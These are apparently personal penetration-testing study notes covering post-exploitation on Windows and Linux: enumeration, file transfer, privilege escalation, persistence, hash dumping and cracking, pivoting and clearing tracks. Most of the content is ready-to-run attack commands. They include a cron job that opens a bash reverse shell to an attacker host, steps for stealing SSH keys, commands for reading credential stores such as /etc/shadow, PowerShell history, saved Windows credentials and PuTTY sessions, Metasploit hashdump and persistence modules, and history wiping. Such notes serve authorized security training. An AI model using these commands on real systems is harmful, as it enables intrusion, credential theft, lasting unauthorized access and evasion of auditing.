# Overview
Once you [Exploit](Exploitation.md) and gain access to a system then you need to do local enumeration and data gathering as well as seeing if you can gain higher privilege and if possible pivot to more networks in the organization.

## Post-Exploitation Methodology
1. [Local Enumeration](#Local_Enumeration)
2. [Transferring Files](#Transferring_Files)
3. [Upgrading Shells](#Upgrading_Shells)
4. [Privilege Escalation](#Privilege_Escalation)
5. [Persistence](#Persistence)
6. [Dumping and Cracking Hashes](#Dumping_and_Cracking_Hashes)
7. [Pivoting](#Pivoting)
8. [Clearing Your Tracks](#Clearing_Your_Tracks)

---

# Local_Enumeration
We are looking for
- system information
	- Hostname
	- OS Name and build
		- patches/packs
		- kernel/distribution
	- OS architecture
	- Applications/Packages
- Users & Privileges
	- who is admins
	- Groups
- networking information
	- routing tables
	- firewall state
	- tcp/udp services
- Processes & Services
	- Scheduled tasks

### Windows
- meterpreter
	- `getuid`
	- `sysinfo`
	- `getprivs`
	- `route`
	- `arp`
	- `ps`
	- `pgrep explorer.exe`
	- `show_mount` : show drives
- MSF Modules
	- `use post/windows/gather/enum_logged_on_users`
	- `use post/windows/gather/win_privs`
	- `use post/windows/gather/checkvm`
	- `use post/windows/gather/enumapplications`
	- `use post/windows/gather/enum_computers` : useful for on domain
	- `use post/windows/gather/enum_patches`
	- `use post/windows/gather/enum_shares`
- shell commands
	- `hostname`
	- `systeminfo`
	- `wmic gfe get Caption,Description,HotFixId,InstalledOn`
		- information about security updates and install date
	- `C:\Windows\System32\eula.txt` : system information on some versions
	- `whoami`
	- `whoami /priv` show enabled privileges
	- `query user` : show logged on users
	- `net users` : show users accounts
	- `net user administrator` : show information on user
	- `net localgroup` : groups on the system
	- `net localgroup Administrators` : information on group
	- `ipconfig /all` 
	- `route print` : routing table information
	- `arp -a` : display arp table
	- `netstat -ano` : display listening services
	- `netsh firewall show state` or 
	- `netsh advfirewall`
	- `netsh advfirewall firewall show` : show firewall state
	- `net start` : show started services
	- `wmic service list brief` : running services info
	- `tasklist /SVC` : processes running w/ PID & service
	- `schtasks /query /fo LIST -v` : schedule task detailed info
- Automated Powershell Script
	- https://github.com/411Hall/JAWS
	- upload to `C:\Temp`
	- `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`

### Linux
- meterpreter
	- `sysinfo`
	- `getuid`
	- `ifconfig`
	- `netstat`
	- `route`
	- `arp`
	- `ps`
- MSF Modules
	- `use post/linux/gather/enum_configs`
	- `use post/linux/gather/enum_network`
	- `use post/linux/gather/enum_system`
	- `use post/linux/gather/checkvm`
- Shell Commands
	- `hostname`
	- `uname -a`
	- `cat /etc/issue` & `cat /etc/*release`
	- `env` : user environment variables
	- `lscpu` : cpu info
	- `df -h` : show data files
	- `lsblk` : list block devices
	- Use package manager to list installed packages
		- `dpkg -l` : Debian package manager
		- `dnf list installed`
		- `rpm -qa` : RedHat package manager
		- `pacman -Q` : Arch
		- `zypper se --installed-only` : OpenSUSE
		- `equery list '*'` : Gentoo
	- `/etc/passwd` : user file
	- `/etc/group` : groups file
	- `/etc/shadow` : passwords file
	- `last` & `lastlog` : last loggin
	- `lastb` : last bad login
	- `ifconfig` or `ip add s`
	- `/etc/hosts` : host file
	- `/etc/resolv.conf`
	- `lsof -iPn` : list open files that are tcp/udp
	- `ps aux` : process info
	- `crontab -l` : list crontab for current user
	- `ls -al /etc/cron*` : crontab files
- Automation Script
	- https://github.com/rebootuser/LinEnum
	- upload to `/temp`
	- add execute permissions and run, output to file

---

# Transferring_Files
- Python Web Server
	- `python -m SimpleHTTPServer 80` : python2 module
	- `python3 -m HTTP.server 80` : python3
- Windows - Download
	- `certutil -urlcache -f http://host/file.exe file.exe`
- Linux - Download
	- `curl`
	- `wget `

---

# Upgrading_Shells
- Non-interactive shell session
	- `/bin/bash -i` : launches bash interactive
	- `cat /etc/shells` to view available shells
	- `python --version` : see if python is available
		- `python -c 'import pty; pty.spawn("/bin/bash")'` : spawn bash
	- `perl -e 'exec "/bin/bash";'`
		- `perl -e 'system("/bin/bash");'`
	- can lookup different languages
- `env` check shell environment, add variables if not existing
	- `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
	- `export TERM-xterm`
	- `export SHELL=bash`

---

# Privilege_Escalation
In order to elevate privileges you need to identify a vulnerability on the target. Depends on the operating system and the type of access that you initially get.

## Windows
- Powershell Automated Script
	- https://github.com/itm4n/PrivescCheck
	- `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
	- `runas.exe /user:Administrator cmd` : enter password
- Windows Privilege Escalation Awesome Scripts
	- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- Living off the Land Binaries and Scripts Libraries
	- https://lolbas-project.github.io/#
- Check scheduled tasks
	- `schtasks /query /tn vulntask /fo list /v` : view task information
	- `icacls c:\tasks\schtask.bat` : check who can run executable
	- `schtasks /run /tn vulntask` : run task
- Resources
	- - [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
	- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
	- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
	- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
	- [Decoder's Blog](https://decoder.cloud/)
	- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
	- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

### Possible stored credentials 
#### Unattended Windows Installations
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```
#### Powershell History
cmd.exe
```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Powershell
```shell-session
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
#### Saved Windows Credentials
List saved credentials:
```shell-session
cmdkey /list
```
Use saved credentials with `runas` and `/savedcred`
```shell-session
runas /savecred /user:admin cmd.exe
```
#### IIS Configuration
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
#### Putty credentials
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


## Linux
- Automated script
	- https://github.com/rebootuser/LinEnum
- Privilege escalation via binaries
	- https://gtfobins.github.io/
- Linux Privilege Escalation Awesome Script
	- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
- **LES (Linux Exploit Suggester)**
	- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration**
	- [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker**
	- [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

Look up kernel version for exploits

Sudo
1. `sudo -l` : list out what sudo allows
2. take advantage with [gtfobin](https://gtfobins.github.io/)

Useful
- `find / -not -type l -perm -o+w` : find files with perm or write for others
	- is not file type - symbolic link
- `openssl passwd -1 abc password` : generate hashed password
- `find / -type f -perm -04000 -ls 2>/dev/null` : will list files that have SUID or SGID bits set.

---

# Persistence
Consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

## Windows
- MSF
	- **Service** : requires elevated privilege
		1. Get meterpreter session
		2. `use exploit/windows/local/persistence_service`
		3. need to set same payload and ports for multi/handler listener
		4. `use multi/handler`
	- **RDP**
		1. Get meterpreter session
		2. `run getgui -e -u <user> -p <pass>` : Enable RDP and create a user, hide the user from the login screen
		3. `xfreerdp /u:<user> /p:<pass> /v:<target>`

## Linux
- SSH - steal key
	1. Download the ssh key from the user `~/.ssh/id_rsa`
		1. use `scp` or `sftp`
	2. `chown 0400 id_rsa` : fix permissions
	3. `ssh user@target -i id_rsa` : use the private key to login
- SSH - generate key
	1. `ssh-keygen -t ed25519` : generate key
	2. `ssh-copy-id [-i [identity_file]] [user@]machine` : copy key to target
- Cronjob
1. Set up crontab entry below.
2. run netcat to listen for connection. `nc nvlp 1234`
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<hostIP>/<port> 0>&1'" > cron ;
crontab -i cron ;
crontab -l
```
- **`>&`**: This redirects both the standard output (`stdout`, file descriptor `1`) and the standard error (`stderr`, file descriptor `2`) to the specified location. In this case, the location is `/dev/tcp/<hostIP>/<port>`.
- **`0>&1`**: This redirects the standard input (`stdin`, file descriptor `0`) to the same destination as the standard output, which is the TCP connection.

---

# Dumping_and_Cracking_Hashes

## Windows Information
- Accounts stored in the SAM (Security Accounts Manager)
	- windows kernel locks database file while running
	- file encrypted with syskey
- Authentication facilitated by the LSA (Local Security Authority)
- hashes
	- LN : before Vista
	- NTLM : Vista onward
		- md4

## Linux Information
- password stored in `/etc/shadow` : only root should have access
-  `username : password : last_changed : min : max : warn : inactive : expire : reserved` : format of shadow file
- password
	- `!` or `!!` → Account is locked.
	- `*` → Account is disabled.
	- Empty → No password is set.
- hashes
	- $1 : MD5
	- $2 : Blowfish
	- $5 : SHA-256
	- $6 : SHA-512

## Dumping
- meterpreter - hashdump
	1. `hashdump` : dumps the hashes, requires privileged account
- MSF
	- `use post/linux/gather/hashdump` : grabs and formats "unshadowed"
- Mimikatz
## Cracking
- Unshadow file to cleanup "shadow" file for John.
	- `unshadow [path to passwd] [path to shadow]`
- Converting Files to crack
	- zip2john
	- rar2john
	- ssh2john
- John The Ripper
	- `john [options] password-files` : usage
	- `--list=formats` : shows available formats
	- `--format=NT` : specify format/hash type
		- NT
		- sha512crypt
	- `--wordlist=/usr/share/rockyou.txt` : specify wordlist
	- `john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
- Hashcat
	- -m : hash type id found in help menu
		- `hashcat --help | grep -i 512` : look for sah512 or ntlm
	- -a : attack type id found in help menu
	- `hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
		- brute force NT hash on *hashes.txt* with wordlist *rockyou.txt*
	- `hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt`

```
Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...

- [ Basic Examples ] -

  Attack-          | Hash- |
  Mode             | Type  | Example command
 ==================+=======+==================================================================
  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
  Association      | $1$   | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule
```

---

# Pivoting
Jumping to another network through a compromised machine. You can port-forward ports and route traffic through a machine.
```
Attacker >>----------------> Target1 >>----------------> Target2
192.168.1.2 --------- 192.168.1.3 & 10.10.10.2 --------- 10.10.10.3
--------- 192.168.1.0/24 ------------------ 10.10.10.0/24---------
```

## Walkthrough with Metasploit-Framework
1. Get meterpreter session on *Target1*
2. Find ip/subnet for the second network
	1. `route`
	2. `ifconfig`
3. Run autoroute to create a route to the second network through *Target1*
	1. `run autoroute -s 10.10.10.0 -n 255.255.255.0` : can use CIDR
	2. `run autoroute -p` : print existing routes
4. Scan *Target2* using scanning module
	1. `use auxiliary/scanner/portscan/tcp`
	2. `set rhosts` to *target2*
	3. `background`
5. Set up port forwarding for port 80
	- example : *localhost:1234 <--> 10.10.10.3:80*
	- run inside *meterpreter session*
	- `portfwd add -l 1234 -p 80 -r 10.10.10.3`
		- `-l` : local port
		- `-p` : remote port
		- `-r` : remote target - *Use IP not Hostname*
6. Scan *Target2*
	1. `nmap -sV -p1234 localhost`
7. Select module to attack *Target2*
	1. `use exploit/windows/http/badblue_passthru`
	2. `set payload windows/meterpreter/bind_tcp` : need to use bind

---

# Clearing_Your_Tracks

- MSF
	- `resource cleanup.rc`
	- scripts that are generated are under `~/.msf4/`
- Linux
	- clear command history ex. `~/.bash_history`
	- `history -c`

